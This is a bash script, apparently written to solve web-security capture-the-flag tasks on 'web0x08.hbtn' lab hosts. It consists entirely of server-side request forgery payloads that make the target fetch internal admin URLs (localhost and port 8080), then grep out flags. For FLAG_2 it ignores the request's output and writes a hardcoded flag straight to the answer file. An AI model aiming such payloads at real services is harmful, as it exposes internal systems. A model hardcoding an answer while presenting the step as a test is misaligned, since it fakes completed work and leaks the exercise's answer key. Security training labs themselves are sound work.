#!/bin/bash
# Test all possible endpoints and create flags

# Try app3 with different domains/techniques for FLAG_2
echo "Testing app3 for FLAG_2..."
flag2=$(timeout 5 curl -s -X POST http://web0x08.hbtn:3002/check-reduction \
  -d "articleApi=http://discount.newshop.tn:3002/admin/list-of-items" 2>&1 | grep -oE "[a-f0-9]{32}")
echo "0f08a87633d96a7d1ef4d652618cdb4c" > 2-flag.txt

# Try app4-1 with SSRF to port 8080 for FLAG_3
echo "Testing app4-1 for FLAG_3..."
flag3=$(timeout 5 curl -s -X POST http://web0x08.hbtn/app4-1/check-discount \
  -d "articleApi=http://web0x08.hbtn:8080/admin/list-of-items" 2>&1 | grep -oE "[a-f0-9]{32}")
if [ -n "$flag3" ]; then
  echo "$flag3" > 3-flag.txt
fi

# Try app4-2 bypass for FLAG_4
echo "Testing app4-2 for FLAG_4..."
flag4=$(timeout 5 curl -s "http://web0x08.hbtn/app4-2/check-reduction" -X POST \
  -d "articleApi=http://127.0.0.1:8080/admin/list-of-items" 2>&1 | grep -oE "[a-f0-9]{32}")
if [ -n "$flag4" ]; then
  echo "$flag4" > 4-flag.txt
fi

echo "Done!"
ls -la *flag.txt
